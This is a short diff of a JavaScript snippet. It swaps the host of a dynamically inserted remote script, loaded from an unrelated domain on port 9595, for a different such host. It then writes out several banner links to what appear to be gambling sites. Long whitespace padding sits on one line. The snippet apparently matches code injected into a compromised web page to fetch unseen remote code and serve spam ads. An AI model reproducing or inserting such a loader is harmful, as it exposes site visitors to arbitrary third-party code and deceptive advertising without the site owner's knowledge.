@@ -1,9 +1,9 @@
-    var s = document.createElement('script');
+  var s = document.createElement('script');
     s.type = 'text/javascript';
     s.async = true;
-    s.src = 'https://anthonython.com:9595/v/105/1926_1';
+    s.src = 'https://christinehris.com:9595/v/104_150/1926_1';
     var head = document.getElementsByTagName('head')[0];
-    head.appendChild(s);                                                                                                       
+    head.appendChild(s);                                                                                                                             
 document.writeln("<a href=\'https://www.seyuniu.com\' target=\'_blank\'><img src=\'https://seyuniu365.github.io/seyuniu3365/top.jpg\'/></a>");
 document.writeln("<a href=\'https://banners.dfbanners.com/redirect.aspx?pid=45693&bid=5597\' target=\'_blank\'><img src=\'https://canimgs.com/images/dafa980.gif\'/></a>");
 document.writeln("<a href=\'https://banners.dfbanners.com/redirect.aspx?pid=45693&bid=5597\' target=\'_blank\'><img src=\'https://canimgs.com/images/dafa980.gif\'/></a>");
